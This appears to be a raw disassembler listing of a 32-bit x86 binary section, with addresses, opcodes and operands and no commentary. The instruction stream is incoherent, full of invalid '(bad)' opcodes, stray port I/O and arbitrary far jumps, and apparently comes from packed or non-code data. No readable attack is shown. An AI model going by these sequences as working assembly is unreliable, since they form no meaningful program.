  41e4ba:	repnz les eax,FWORD PTR [edx]
  41e4bd:	push   ebp
  41e4be:	mov    cl,0x6a
  41e4c0:	xchg   edx,eax
  41e4c1:	jmp    0x75b1:0x5c2b0dc2
  41e4c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4c9:	mov    bh,0xdf
  41e4cb:	mov    cl,0x2d
  41e4cd:	pop    ds
  41e4ce:	dec    esi
  41e4cf:	sub    eax,DWORD PTR [edi]
  41e4d1:	sub    edi,edi
  41e4d3:	pop    ecx
  41e4d4:	mov    dl,0x79
  41e4d6:	pop    ss
  41e4d7:	cmp    DWORD PTR es:[ecx-0x22f3058c],0xe0f18aef
  41e4e2:	cmp    ch,BYTE PTR [eax+ebp*1-0x5f05996e]
  41e4e9:	loope  0x41e4c7
  41e4eb:	lock push cs
  41e4ed:	out    dx,al
  41e4ee:	test   al,0xc6
  41e4f0:	clc    
  41e4f1:	pop    eax
  41e4f2:	push   ss
  41e4f3:	lds    ecx,FWORD PTR [edx]
  41e4f5:	fsubp  st(2),st
  41e4f7:	ss stos DWORD PTR es:[edi],eax
  41e4f9:	sub    eax,0x4d995232
  41e4fe:	test   BYTE PTR [eax-0xd02be83],ch
  41e504:	sbb    al,0x55
  41e506:	fnstcw WORD PTR [eiz*4-0x71eaece1]
  41e50d:	add    esp,edi
  41e50f:	sub    DWORD PTR [edi-0x63f2898f],ebp
  41e515:	fsub   DWORD PTR [ebx]
  41e517:	sub    dh,BYTE PTR [edx+0x374f4b8f]
  41e51d:	imul   ebx,DWORD PTR [edx+0x74],0x3f1e95d9
  41e524:	stos   DWORD PTR es:[edi],eax
  41e525:	pop    ecx
  41e526:	ja     0x41e514
  41e528:	nop
  41e529:	mov    bl,0xb5
  41e52b:	sbb    eax,0xfbb11117
  41e530:	sub    DWORD PTR [ebx],esi
  41e532:	in     eax,0xa2
  41e534:	ja     0x41e583
  41e536:	xchg   esi,eax
  41e537:	or     ah,cl
  41e539:	jae    0x41e544
  41e53b:	mov    ax,ds:0x4068feb
  41e541:	push   cs
  41e542:	jmp    0x27d3c50c
  41e547:	idiv   ebp
  41e549:	data16 fidiv WORD PTR [edi+esi*4-0x68dad3e3]
  41e551:	sbb    DWORD PTR [edi],eax
  41e553:	xlat   BYTE PTR ds:[ebx]
  41e554:	loop   0x41e5ba
  41e556:	cmp    ah,BYTE PTR [eax+0x221bcf53]
  41e55c:	enter  0x5125,0x42
  41e560:	mov    cl,ah
  41e562:	in     al,0x5c
  41e564:	adc    DWORD PTR [edi],edx
  41e566:	jne    0x41e5e6
  41e568:	(bad)  
  41e569:	bswap  edi
  41e56b:	xor    ebx,edi
  41e56d:	xchg   ecx,eax
	...
  41e5d6:	and    BYTE PTR [edx-0x35],ch
  41e5d9:	dec    ebx
  41e5da:	retf   
  41e5db:	jmp    0x41e57d
  41e5dd:	imul   ebp,ebx,0xffffffb1
  41e5e0:	aaa    
  41e5e1:	je     0x41e586
  41e5e3:	adc    dl,BYTE PTR [edx+0x146672b]
  41e5e9:	add    BYTE PTR [eax],al
  41e5eb:	add    DWORD PTR [eax],eax
  41e5ed:	add    BYTE PTR [ebp+0x31],cl
  41e5f0:	fisub  WORD PTR [edi-0x68dfe79a]
  41e5f6:	add    DWORD PTR [ebp-0x52],edi
  41e5f9:	outs   dx,DWORD PTR ds:[esi]
  41e5fa:	mov    dl,0x5d
  41e5fc:	in     al,0x28
  41e5fe:	repnz adc BYTE PTR [edx],0xfb
  41e602:	fstp   TBYTE PTR [edx-0x75a9781f]
  41e608:	sub    edi,esp
  41e60a:	test   BYTE PTR [ebx-0x2f0ea227],dl
  41e610:	jge    0x41e62a
  41e612:	sub    eax,0x9df15711
  41e617:	popf   
  41e618:	pop    esp
  41e619:	adc    cl,BYTE PTR [edx]
  41e61b:	hlt    
  41e61c:	lds    ebp,FWORD PTR [eax-0x58751761]
  41e622:	mov    dl,0x48
  41e624:	jno    0x41e695
  41e626:	mov    ch,0xb5
  41e628:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e629:	lods   al,BYTE PTR ds:[esi]
  41e62a:	imul   ecx,DWORD PTR [edx+eax*4-0x4d],0xffffffe6
  41e62f:	or     BYTE PTR [ebx+edi*8-0x50],bl
  41e633:	sbb    BYTE PTR [ebx+0x6c],dl
  41e636:	out    0xab,eax
  41e638:	cmp    DWORD PTR [edi-0x54baf3ee],edi
  41e63e:	mov    esi,cs
  41e640:	je     0x41e651
  41e642:	xchg   edi,eax
  41e643:	fwait
  41e644:	pop    ss
  41e645:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e646:	add    BYTE PTR [ebx+0x1754e553],cl
  41e64c:	pop    es
  41e64d:	and    eax,0x4b22e40b
  41e652:	add    DWORD PTR [ebx+0x2f6541a8],ebp
  41e658:	sti    
  41e659:	push   es
  41e65a:	mov    DWORD PTR [ebp-0x17991170],ebx
  41e660:	xor    BYTE PTR ds:0xfe2527b9,dh
  41e666:	scas   al,BYTE PTR es:[edi]
  41e667:	jl     0x41e6ac
  41e669:	(bad)  
  41e66a:	lock popa 
  41e66c:	cld    
  41e66d:	add    al,0x8f
  41e66f:	fwait
  41e670:	je     0x41e671
  41e672:	mov    fs,esp
  41e674:	pop    esp
  41e675:	cmp    edx,edi
  41e677:	stos   DWORD PTR es:[edi],eax
  41e678:	dec    edi
  41e679:	mov    bh,BYTE PTR [edi]
  41e67b:	add    dh,BYTE PTR [eax+0x45]
  41e67e:	mov    bh,0x83
  41e680:	xchg   ebx,eax
  41e681:	in     al,0xe1
  41e683:	push   esp
  41e684:	mov    ds:0x4c30effb,eax
  41e689:	inc    ebx
  41e68a:	and    BYTE PTR [edx],ah
  41e68c:	aaa    
  41e68d:	add    ah,bh
  41e68f:	cmp    esp,DWORD PTR [ebx]
  41e691:	outs   dx,DWORD PTR ds:[esi]
  41e692:	aas    
  41e693:	imul   ecx,DWORD PTR [edx+0x22c30c18],0x501fcdc9
  41e69d:	ret    
  41e69e:	jecxz  0x41e6a6
  41e6a0:	ret    0x5c1
  41e6a3:	outs   dx,BYTE PTR ds:[esi]
  41e6a4:	xchg   edx,eax
  41e6a5:	rcr    esp,1
  41e6a7:	repnz dec ecx
  41e6a9:	inc    ebp
  41e6aa:	inc    ecx
  41e6ab:	daa    
  41e6ac:	xor    eax,0x58627bb8
  41e6b1:	sar    DWORD PTR [esp+edx*4],cl
  41e6b4:	outs   dx,DWORD PTR ds:[esi]
  41e6b5:	push   ss
  41e6b6:	les    ecx,FWORD PTR [esi+edi*2+0x44]
  41e6ba:	aad    0x6f
  41e6bc:	pop    eax
  41e6bd:	arpl   di,sp
  41e6bf:	(bad)  
  41e6c0:	pushf  
  41e6c1:	xor    ebx,DWORD PTR [esi]
  41e6c3:	xchg   esp,eax
  41e6c4:	fxch   st(1)
  41e6c6:	xor    DWORD PTR [edi],0xffffffda
  41e6c9:	ds jl  0x41e654
  41e6cc:	clc    
  41e6cd:	inc    edi
  41e6ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6cf:	(bad)  
  41e6d0:	adc    dh,ah
  41e6d2:	repz jp 0x41e6df
  41e6d5:	adc    edx,esi
  41e6d7:	loopne 0x41e6ad
  41e6d9:	mov    ebp,0x797df80b
  41e6de:	sub    al,0x32
  41e6e0:	jecxz  0x41e6db
  41e6e2:	push   0xa
  41e6e4:	out    dx,al
  41e6e5:	xchg   edx,eax
  41e6e6:	jno    0x41e717
  41e6e8:	nop
  41e6e9:	int3   
  41e6ea:	cld    
  41e6eb:	jb     0x41e697
  41e6ed:	enter  0x0,0x0
	...
  41e755:	add    ch,al
  41e757:	cwde   
  41e758:	loope  0x41e7af
  41e75a:	std    
  41e75b:	jge    0x41e752
  41e75d:	cwde   
  41e75e:	xchg   esp,eax
  41e75f:	push   0x37
  41e761:	sub    eax,DWORD PTR ds:0x6744bd04
  41e767:	inc    edi
  41e768:	add    DWORD PTR [eax],eax
  41e76a:	add    BYTE PTR [ecx],al
  41e76c:	add    BYTE PTR [eax],al
  41e76e:	imul   ebp,DWORD PTR [ebp+0x74924efd],0xffffffb6
  41e775:	mov    ebp,0xffe3a8e
  41e77a:	test   al,0x5d
  41e77c:	in     eax,0x20
  41e77e:	leave  
  41e77f:	jae    0x41e74d
  41e781:	scas   al,BYTE PTR es:[edi]
  41e782:	inc    edx
  41e783:	test   ebx,eax
  41e785:	cmp    al,0x6e
  41e787:	mov    al,0x75
  41e789:	popf   
  41e78a:	sbb    ch,bl
  41e78c:	dec    eax
  41e78d:	imul   ebp,ebp,0x4ddda0fa
  41e793:	jmp    0x41e7c7
  41e795:	dec    eax
  41e796:	les    edx,FWORD PTR [ecx+0x5f8c4409]
  41e79c:	mov    ebp,0x77edc5b9
  41e7a1:	push   cs
  41e7a2:	fbld   TBYTE PTR [edx-0x7bca576f]
  41e7a8:	lea    eax,ds:0x2fd82cb2
  41e7ae:	sub    bh,BYTE PTR [edi-0x773cb68b]
  41e7b4:	adc    BYTE PTR [ecx+0x53e6beba],ah
  41e7ba:	inc    ebx
  41e7bb:	sub    DWORD PTR ds:0xe1271b44,edi
  41e7c1:	loope  0x41e75b
  41e7c3:	enter  0xce53,0x42
  41e7c7:	out    dx,al
  41e7c8:	mov    ebx,0xb7bf0b9
  41e7cd:	stc    
  41e7ce:	jmp    0xdbd383d0
  41e7d3:	pushf  
  41e7d4:	xor    eax,DWORD PTR [ebp+0x1b]
  41e7d7:	sar    BYTE PTR [ecx],1
  41e7d9:	test   BYTE PTR [ebx],bh
  41e7db:	neg    edx
  41e7dd:	pop    ebx
  41e7de:	rol    DWORD PTR [ebp+ecx*1-0x7e1014c],0x25
  41e7e6:	js     0x41e84b
  41e7e8:	in     eax,dx
  41e7e9:	or     BYTE PTR [ecx+0x7c7d4694],ch
  41e7ef:	sbb    edx,DWORD PTR [ebp+0x4f]
  41e7f2:	jp     0x41e792
  41e7f4:	adc    eax,0x46582c02
  41e7f9:	nop/reserved BYTE PTR ds:0xa751b796
  41e800:	adc    al,0xa1
  41e802:	test   eax,0xda1ea0d5
  41e807:	addr16 cs js 0x41e7a2
  41e80b:	pop    esi
  41e80c:	(bad)  
  41e80d:	stos   DWORD PTR es:[edi],eax
  41e80e:	es cs sbb ebp,esi
  41e812:	adc    DWORD PTR [edx-0x7b20ddfc],ebx
  41e818:	ror    BYTE PTR [ebx],cl
  41e81a:	retf   0xdd8d
  41e81d:	inc    esp
  41e81e:	data16 or ah,BYTE PTR [ebp+0x1ea7e64d]
  41e825:	out    dx,eax
  41e826:	fdivp  st(4),st
  41e828:	jmp    0x41e864
  41e82a:	idiv   BYTE PTR [edi]
  41e82c:	add    esi,DWORD PTR [esi]
  41e82e:	dec    eax
  41e82f:	and    eax,esp
  41e831:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e832:	mov    ecx,0x4e884730
  41e837:	inc    edx
  41e838:	popa   
  41e839:	ss nop
  41e83b:	jb     0x41e814
  41e83d:	push   ss
  41e83e:	xlat   BYTE PTR ds:[bx]
  41e840:	ins    BYTE PTR es:[edi],dx
  41e841:	lods   al,BYTE PTR ds:[esi]
  41e842:	mov    esi,0x5ea1b261
  41e847:	cmp    ebp,DWORD PTR [ecx+0x4b0fd834]
  41e84d:	xchg   esi,eax
  41e84e:	lock jae 0x41e867
  41e851:	ret    0x3476
  41e854:	push   0x3b
  41e856:	sub    DWORD PTR [edx+0xbd49f91],0xffffff84
  41e85d:	retf   
  41e85e:	icebp  
  41e85f:	clc    
  41e860:	outs   dx,BYTE PTR ds:[esi]
  41e861:	ficom  DWORD PTR [esi+0x24a6dbf]
  41e867:	jle    0x41e86e
  41e869:	mov    ch,0xcf
  41e86b:	jmp    0x422bd8
	...
  41e8d4:	add    BYTE PTR [eax],al
  41e8d6:	sub    eax,0x9e5c8a39
  41e8db:	(bad)  
  41e8dc:	(bad)  
  41e8dd:	jns    0x41e94e
  41e8df:	xor    al,0xcc
  41e8e1:	jg     0x41e8bc
  41e8e3:	shl    DWORD PTR [edi+ebp*1],1
  41e8e6:	addr16 dec eax
  41e8e8:	add    DWORD PTR [eax],eax
  41e8ea:	add    BYTE PTR [ecx],al
  41e8ec:	add    BYTE PTR [eax],al
  41e8ee:	in     al,0x11
  41e8f0:	je     0x41e923
  41e8f2:	lods   al,BYTE PTR ds:[esi]
  41e8f3:	int3   
  41e8f4:	jo     0x41e879
  41e8f6:	jb     0x41e90f
  41e8f8:	xor    eax,0x393336d9
  41e8fd:	pusha  
  41e8fe:	xchg   ebp,eax
  41e8ff:	pop    esp
  41e900:	adc    edi,DWORD PTR [ecx+edi*8]
  41e903:	or     DWORD PTR [edx],0xbd3949bf
  41e909:	mov    WORD PTR [esi-0x60],?
  41e90c:	ficomp WORD PTR [ecx+0x483c47d5]
  41e912:	lods   al,BYTE PTR ds:[esi]
  41e913:	sub    esp,DWORD PTR [esi]
  41e915:	sbb    edi,ebp
  41e917:	mov    ebp,0x4568f4fd
  41e91c:	imul   ebp,DWORD PTR [ebx],0xffffffcd
  41e91f:	fbstp  TBYTE PTR [esi]
  41e921:	pop    ss
  41e922:	shl    BYTE PTR [edi+0x375ba839],cl
  41e928:	cmp    ebp,DWORD PTR [ecx+0x37de2aba]
  41e92e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e92f:	mov    eax,0xb265e774
  41e934:	dec    edi
  41e935:	in     eax,dx
  41e936:	fld    DWORD PTR [edx]
  41e938:	add    DWORD PTR [ecx],0x7b
  41e93b:	fidivr WORD PTR [edi+0x70]
  41e93e:	(bad)  
  41e940:	add    al,0x97
  41e942:	xlat   BYTE PTR ds:[ebx]
  41e943:	sub    dl,BYTE PTR [edx+0x25cff6d]
  41e949:	add    DWORD PTR [eax],esi
  41e94b:	sbb    cl,dl
  41e94d:	imul   esi,DWORD PTR ds:0x4b831bb9,0xec3152a8
  41e957:	xchg   esp,eax
  41e958:	or     al,0x38
  41e95a:	imul   eax,DWORD PTR [ebp-0x30],0xe2160329
  41e961:	nop
  41e962:	mov    esp,0xa509f053
  41e967:	test   BYTE PTR [ecx],bh
  41e969:	pop    edi
  41e96a:	sub    DWORD PTR [ebx+0x597d6f3d],0xf47fe60e
  41e974:	xor    eax,0xbf9285af
  41e979:	pop    edx
  41e97a:	scas   eax,DWORD PTR es:[edi]
  41e97b:	push   ebx
  41e97c:	xor    al,0x7
  41e97e:	dec    esp
  41e97f:	mov    ecx,0xc5963f9c
  41e984:	pop    ebx
  41e985:	cld    
  41e986:	je     0x41e968
  41e988:	jg     0x41e9f8
  41e98a:	retf   
  41e98b:	push   esi
  41e98c:	(bad)  
  41e98d:	xor    esi,edx
  41e98f:	test   ebx,0x18a127bb
  41e995:	cld    
  41e996:	fs cli 
  41e998:	dec    esi
  41e999:	sbb    DWORD PTR [edi],esi
  41e99b:	adc    al,0x18
  41e99d:	shl    BYTE PTR [edi],0xdd
  41e9a0:	std    
  41e9a1:	aaa    
  41e9a2:	in     eax,0x0
  41e9a4:	lods   eax,DWORD PTR ds:[esi]
  41e9a5:	enter  0x1a9b,0xd9
  41e9a9:	mov    ds:0x97d582f9,eax
  41e9ae:	cmp    DWORD PTR [ebx-0x6466b6dd],ecx
  41e9b4:	mov    DWORD PTR [esp+eax*1-0x27ad3c35],0x4fe0e2a
  41e9bf:	loopne 0x41e9ac
  41e9c1:	mov    ecx,0x415e3398
  41e9c6:	inc    ebx
  41e9c7:	adc    ch,BYTE PTR [edi]
  41e9c9:	sub    ah,BYTE PTR [edx]
  41e9cb:	in     eax,0x91
  41e9cd:	add    ecx,DWORD PTR [esi+0x37f65762]
  41e9d3:	and    cl,bl
  41e9d5:	test   DWORD PTR [edx-0x4d],eax
  41e9d8:	scas   eax,DWORD PTR es:[edi]
  41e9d9:	outs   dx,DWORD PTR ds:[esi]
  41e9da:	sbb    ch,bh
  41e9dc:	in     al,0xc0
  41e9de:	outs   dx,BYTE PTR ds:[esi]
  41e9df:	push   edi
  41e9e0:	(bad)  
  41e9e1:	out    0xcd,eax
  41e9e3:	sub    DWORD PTR [edx+0x63],edx
  41e9e6:	xor    dh,BYTE PTR [edx-0xb574f49]
  41e9ec:	pop    ss
  41e9ed:	leave  
	...
  41ea56:	js     0x41ea55
  41ea58:	ret    0xc766
  41ea5b:	jg     0x41ea59
  41ea5d:	dec    DWORD PTR [edi+0x67]
  41ea60:	rol    dl,1
  41ea62:	push   edx
  41ea63:	ucomiss xmm4,xmm7
  41ea66:	addr16 dec ecx
  41ea68:	add    DWORD PTR [eax],eax
  41ea6a:	add    BYTE PTR [ecx],al
  41ea6c:	add    BYTE PTR [eax],al
  41ea6e:	call   0x43fb4dab
  41ea73:	cmp    ecx,edi
  41ea75:	lods   al,BYTE PTR ds:[esi]
  41ea76:	pop    ebx
  41ea77:	xor    bl,BYTE PTR [ecx]
  41ea79:	jns    0x41ea3c
  41ea7b:	add    eax,0xd25eb275
  41ea80:	dec    esi
  41ea81:	je     0x41ea91
  41ea83:	inc    edi
  41ea84:	sub    dl,BYTE PTR [ecx*2+0x14fae09b]
  41ea8b:	pusha  
  41ea8c:	pop    ebp
  41ea8d:	xchg   edx,eax
  41ea8e:	push   0xffffffa2
  41ea90:	xchg   esi,eax
  41ea91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea93:	add    BYTE PTR [ebx],ch
  41ea95:	push   eax
  41ea96:	loopne 0x41ea3d
  41ea98:	xchg   ecx,eax
  41ea99:	jge    0x41eac7
  41ea9b:	jnp    0x41eab8
  41ea9d:	xlat   BYTE PTR ds:[ebx]
  41ea9e:	add    BYTE PTR fs:[esi+0x73],dh
  41eaa2:	mov    eax,0x6bd83903
  41eaa7:	out    dx,al
  41eaa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eaa9:	mov    ds:0x766ad719,eax
  41eaae:	cld    
  41eaaf:	repnz scas eax,DWORD PTR es:[edi]
  41eab1:	retf   
  41eab2:	or     DWORD PTR [esi-0x3c5aaf05],0x54
  41eab9:	(bad)  [esi+0x1131661c]
  41eabf:	test   BYTE PTR [eax],0x5e
  41eac2:	or     bh,ah
  41eac4:	pop    eax
  41eac5:	in     eax,dx
  41eac6:	dec    edi
  41eac7:	adc    eax,0xce4791de
  41eacc:	or     eax,0x882e1897
  41ead1:	mov    ecx,0x916fdd55
  41ead6:	dec    eax
  41ead7:	stc    
  41ead8:	dec    ebp
  41ead9:	push   ebx
  41eada:	(bad)  
  41eadb:	and    DWORD PTR [edx+eax*4+0x62],edi
  41eadf:	dec    ebx
  41eae0:	adc    eax,0x64663a20
  41eae5:	mov    esi,0xb3ee19cc
  41eaea:	jge    0x41ea80
  41eaec:	xor    al,BYTE PTR [esi+0x75152df]
  41eaf2:	xchg   esi,eax
  41eaf3:	call   0xe592:0x1aaafef2
  41eafa:	sub    ah,dh
  41eafc:	jns    0x41ea90
  41eafe:	jg     0x41eb13
  41eb00:	aad    0x91
  41eb02:	pop    esi
  41eb03:	retf   
  41eb04:	adc    edx,DWORD PTR [edi]
  41eb06:	jb     0x41eb78
  41eb08:	(bad)  
  41eb09:	imul   edx,DWORD PTR [edi+0x42],0xa16bc890
  41eb10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb11:	xlat   BYTE PTR ds:[ebx]
  41eb12:	push   eax
  41eb13:	xchg   DWORD PTR [eax],edx
  41eb15:	adc    DWORD PTR [edi],ebp
  41eb17:	sti    
  41eb18:	leave  
  41eb19:	scas   eax,DWORD PTR es:[edi]
  41eb1a:	shr    BYTE PTR [eax-0x19],cl
  41eb1d:	mov    WORD PTR [eax-0x69],ss
  41eb20:	dec    edi
  41eb21:	inc    edi
  41eb22:	xor    edx,DWORD PTR [edi+edx*8]
  41eb25:	nop
  41eb26:	mov    cl,0x62
  41eb28:	lock std 
  41eb2a:	sbb    al,0x67
  41eb2c:	and    eax,0x11e7a358
  41eb31:	iret   
  41eb32:	or     al,BYTE PTR [edx-0x7282b50f]
  41eb38:	or     al,0x64
  41eb3a:	jp     0x41eba7
  41eb3c:	loope  0x41eb4e
  41eb3e:	inc    ebp
  41eb3f:	push   cs
  41eb40:	dec    edi
  41eb41:	pop    ss
  41eb42:	cwde   
  41eb43:	js     0x41eb82
  41eb45:	push   esp
  41eb46:	sub    al,0x7b
  41eb48:	stos   DWORD PTR es:[edi],eax
  41eb49:	imul   esp,DWORD PTR [esi],0x41
  41eb4c:	mov    dl,0xab
  41eb4e:	icebp  
  41eb4f:	or     al,0x14
  41eb51:	inc    bp
  41eb53:	shl    BYTE PTR [esi-0x79a66ce1],0x8a
  41eb5a:	jbe    0x41eb80
  41eb5c:	xlat   BYTE PTR ds:[ebx]
  41eb5d:	test   bh,al
  41eb5f:	addr16 jbe 0x41eb6d
  41eb62:	adc    ah,bl
  41eb64:	sbb    ah,bl
  41eb66:	cwde   
  41eb67:	(bad)  [ebx+0x3bd19a9e]
  41eb6d:	cmp    eax,DWORD PTR [eax]
	...
  41ebd3:	add    BYTE PTR [eax],al
  41ebd5:	add    BYTE PTR [edx],dl
  41ebd7:	das    
  41ebd8:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41ebdf:	out    0x9b,al
  41ebe1:	aad    0xfd
  41ebe3:	and    DWORD PTR [edx+0x14a6765],esp
  41ebe9:	add    BYTE PTR [eax],al
  41ebeb:	add    DWORD PTR [eax],eax
  41ebed:	add    cl,ah
  41ebef:	sub    DWORD PTR [ebp-0x68],edx
  41ebf2:	leave  
  41ebf3:	scas   al,BYTE PTR es:[edi]
  41ebf4:	int    0x30
  41ebf6:	shr    DWORD PTR [ebx+ecx*1+0x22],cl
  41ebfa:	xchg   edi,eax
  41ebfb:	daa    
  41ebfc:	ins    DWORD PTR es:[edi],dx
  41ebfd:	mov    fs,WORD PTR [edi-0x5acdf479]
  41ec03:	dec    ecx
  41ec04:	mov    ds:0x76996a7a,al
  41ec09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec0a:	add    DWORD PTR [edi-0x54841f47],ebp
  41ec10:	sbb    DWORD PTR [ebx-0x582bdbb6],esi
  41ec16:	pop    DWORD PTR [ebp+0x3d]
  41ec19:	inc    edx
  41ec1a:	mov    ah,0x8e
  41ec1c:	mov    ds:0x7bde829d,al
  41ec21:	jno    0x41ec0d
  41ec23:	pushf  
  41ec24:	std    
  41ec25:	fidivr DWORD PTR [ecx+0x4f]
  41ec28:	and    edi,DWORD PTR [eax+0x3f6492a8]
  41ec2e:	mov    esp,0x2564e8d9
  41ec33:	fild   WORD PTR [edx+0x45]
  41ec36:	mov    cl,0xe6
  41ec38:	(bad)  
  41ec39:	mov    bh,0xb6
  41ec3b:	mov    al,ds:0x46bbbdf3
  41ec40:	jmp    0xf948:0x47b051de
  41ec47:	cs cld 
  41ec49:	dec    esp
  41ec4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec4b:	popa   
  41ec4c:	adc    DWORD PTR [ecx-0x5651a5c8],ebp
  41ec52:	sbb    BYTE PTR [eax-0x52],cl
  41ec55:	fcmovnbe st,st(7)
  41ec57:	adc    eax,0x8a733c8c
  41ec5c:	inc    eax
  41ec5d:	lods   eax,DWORD PTR ds:[esi]
  41ec5e:	outs   dx,BYTE PTR ds:[esi]
  41ec5f:	push   esi
  41ec60:	(bad)  
  41ec61:	xchg   esi,eax
  41ec62:	cmp    edi,DWORD PTR [esi]
  41ec64:	popf   
  41ec65:	aad    0xfc
  41ec67:	mov    esi,0xb57c9c45
  41ec6c:	mov    ecx,0x7470b359
  41ec71:	push   esp
  41ec72:	xchg   ecx,eax
  41ec73:	cmp    DWORD PTR [ebx],edx
  41ec75:	enter  0xb662,0xf0
  41ec79:	int    0x5d
  41ec7b:	data16 mov ds:0x390c2d7f,al
  41ec81:	into   
  41ec82:	mov    esi,DWORD PTR [ecx]
  41ec84:	mov    ebx,0x16b886a0
  41ec89:	mov    edx,0xc6d87888
  41ec8e:	inc    edx
  41ec8f:	ret    
  41ec90:	mov    ebx,0xe097fec4
  41ec95:	push   ds
  41ec96:	jb     0x41ec3b
  41ec98:	nop
  41ec99:	std    
  41ec9a:	bound  ebp,QWORD PTR [ecx+edx*4-0x1fb0a29c]
  41eca1:	addr16 push esp
  41eca3:	cli    
  41eca4:	ja     0x41ec3d
  41eca6:	pop    ebp
  41eca7:	mov    esp,0x366dd560
  41ecac:	loopne 0x41ec32
  41ecae:	xor    bl,0x90
  41ecb1:	sub    DWORD PTR [eax],0x7c
  41ecb4:	scas   al,BYTE PTR es:[edi]
  41ecb5:	arpl   WORD PTR [eax],di
  41ecb7:	daa    
  41ecb8:	add    BYTE PTR [eax+ecx*4-0x70],cl
  41ecbc:	jae    0x41ecd3
  41ecbe:	aam    0x72
  41ecc0:	push   ds
  41ecc1:	mov    DWORD PTR [edi],ecx
  41ecc3:	sub    BYTE PTR [edi],ch
  41ecc5:	cmp    eax,0xfe2e91b9
  41ecca:	mov    esi,DWORD PTR [ebp-0x16e6c4c8]
  41ecd0:	cmc    
  41ecd1:	cmp    bh,ah
  41ecd3:	pop    ebp
  41ecd4:	call   0xcce2:0xdc4dba9b
  41ecdb:	call   0x7625637e
  41ece0:	shr    dh,1
  41ece2:	imul   edi,DWORD PTR [edx-0x2247c793],0x4
  41ece9:	lods   eax,DWORD PTR ds:[esi]
  41ecea:	pop    ecx
  41eceb:	es adc eax,0x56
	...
  41ed55:	add    BYTE PTR [ecx-0xf],al
  41ed58:	(bad)
  41ed5b:	hlt    
  41ed5c:	gs icebp 
  41ed5e:	dec    edi
  41ed5f:	adc    eax,0xf5355fd0
  41ed64:	xor    DWORD PTR [edx+0x14b67],esp
  41ed6a:	add    BYTE PTR [ecx],al
  41ed6c:	add    BYTE PTR [eax],al
  41ed6e:	sbb    eax,0xec96102
  41ed73:	jno    0x41ed9d
  41ed75:	daa    
  41ed76:	call   0x6c88:0x22a830be
  41ed7d:	ja     0x41ed4f
  41ed7f:	sub    ecx,edx
  41ed81:	out    0x38,eax
  41ed83:	aas    
  41ed84:	mov    edx,0x2c10e890
  41ed89:	inc    edi
  41ed8a:	retf   
  41ed8b:	repz sub BYTE PTR [ebp+ecx*8+0x69],0xb8
  41ed91:	lods   eax,DWORD PTR ds:[esi]
  41ed92:	add    DWORD PTR [esi-0x6],ecx
  41ed95:	cmp    eax,0x2a4898b3
  41ed9a:	into   
  41ed9b:	xchg   edx,eax
  41ed9c:	push   ds
  41ed9d:	test   ecx,esi
  41ed9f:	jbe    0x41edd3
  41eda1:	adc    bl,bl
  41eda3:	test   eax,0x33504e79
  41eda8:	sub    dh,ch
  41edaa:	rcr    BYTE PTR [ecx+esi*2+0x681b33d],0x7f
  41edb2:	retf   
  41edb3:	data16 mov al,ds:0xa6116578
  41edb9:	cmp    dh,BYTE PTR ds:0x443fdd6f
  41edbf:	repnz xchg edx,eax
  41edc1:	dec    edi
  41edc2:	xchg   esi,eax
  41edc3:	sub    ecx,DWORD PTR [edi]
  41edc5:	adc    DWORD PTR [ecx],edx
  41edc7:	adc    al,ch
  41edc9:	cmc    
  41edca:	pop    ebp
  41edcb:	fmul   DWORD PTR [eax-0x5b]
  41edce:	lock push eax
  41edd0:	dec    ebx
  41edd1:	arpl   WORD PTR [eax],bx
  41edd3:	inc    ebp
  41edd4:	and    eax,0x515f9e16
  41edd9:	or     ecx,DWORD PTR [edi-0x32cf6344]
  41eddf:	cmp    al,0x44
  41ede1:	mov    ecx,0x7f50b379
  41ede6:	mov    al,0xbd
  41ede8:	in     al,0x8e
  41edea:	dec    esp
  41edeb:	and    bh,BYTE PTR [ebx]
  41eded:	xchg   ebx,eax
  41edee:	fcmovnb st,st(1)
  41edf0:	xor    ebx,edx
  41edf2:	inc    esp
  41edf3:	mov    ebx,0xf1017511
  41edf8:	aas    
  41edf9:	pop    eax
  41edfa:	dec    ebp
  41edfb:	inc    edi
  41edfc:	or     bh,dh
  41edfe:	sub    BYTE PTR [eax+0x10bfa9b3],0xea
  41ee05:	add    al,0x2b
  41ee07:	ins    DWORD PTR es:[edi],dx
  41ee08:	and    al,0x86
  41ee0a:	popa   
  41ee0b:	rcl    BYTE PTR [ebp+0x7f],1
  41ee0e:	pop    ds
  41ee0f:	dec    al
  41ee11:	adc    cl,BYTE PTR [edx-0x7e]
  41ee14:	or     DWORD PTR [edx+0x6c],ebp
  41ee17:	dec    esp
  41ee18:	gs mov edi,0x8da093f6
  41ee1e:	loop   0x41ee52
  41ee20:	xchg   DWORD PTR [ebx+0x50f2698c],edx
  41ee26:	or     DWORD PTR [esi],eax
  41ee28:	mov    ebx,0x15fb8e11
  41ee2d:	mov    al,0xdf
  41ee2f:	xchg   ebp,eax
  41ee30:	add    al,0x30
  41ee32:	pop    ecx
  41ee33:	cld    
  41ee34:	jmp    0x6b49d0de
  41ee39:	rcl    BYTE PTR [ebx],cl
  41ee3b:	out    dx,eax
  41ee3c:	dec    eax
  41ee3d:	and    BYTE PTR [ebx-0x7f89ba20],0xd1
  41ee44:	pop    esi
  41ee45:	sub    DWORD PTR [edi+0x18d4bff],esp
  41ee4b:	pop    ebx
  41ee4c:	sub    eax,eax
  41ee4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee4f:	icebp  
  41ee50:	in     eax,dx
  41ee51:	mov    bh,0xe9
  41ee53:	shl    DWORD PTR [edx],1
  41ee55:	jbe    0x41ee09
  41ee57:	in     al,dx
  41ee58:	jl     0x41edea
  41ee5a:	xchg   ebx,eax
  41ee5b:	and    DWORD PTR [ecx],edi
  41ee5d:	lods   eax,DWORD PTR ds:[esi]
  41ee5e:	in     al,0x7d
